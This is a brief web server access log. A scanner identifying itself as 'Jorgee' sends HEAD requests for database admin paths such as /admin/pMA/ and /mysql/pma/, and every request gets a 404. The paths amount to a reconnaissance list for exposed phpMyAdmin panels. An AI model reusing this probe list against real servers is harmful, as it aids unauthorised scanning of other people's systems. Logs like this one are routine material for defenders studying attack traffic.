64.247.184.100 - - [26/May/2015:06:45:05 -0700] "HEAD http://54.245.232.47:80/admin/sqladmin/ HTTP/1.1" 404 218 "-" "Jorgee"
64.247.184.100 - - [26/May/2015:06:45:05 -0700] "HEAD http://54.245.232.47:80/admin/db/ HTTP/1.1" 404 218 "-" "Jorgee"
64.247.184.100 - - [26/May/2015:06:45:05 -0700] "HEAD http://54.245.232.47:80/admin/web/ HTTP/1.1" 404 218 "-" "Jorgee"
64.247.184.100 - - [26/May/2015:06:45:05 -0700] "HEAD http://54.245.232.47:80/admin/pMA/ HTTP/1.1" 404 218 "-" "Jorgee"
64.247.184.100 - - [26/May/2015:06:45:06 -0700] "HEAD http://54.245.232.47:80/mysql/pma/ HTTP/1.1" 404 218 "-" "Jorgee"
64.247.184.100 - - [26/May/2015:06:45:06 -0700] "HEAD http://54.245.232.47:80/mysql/db/ HTTP/1.1" 404 218 "-" "Jorgee"
64.247.184.100 - - [26/May/2015:06:45:06 -0700] "HEAD http://54.245.232.47:80/mysql/web/ HTTP/1.1" 404 218 "-" "Jorgee"
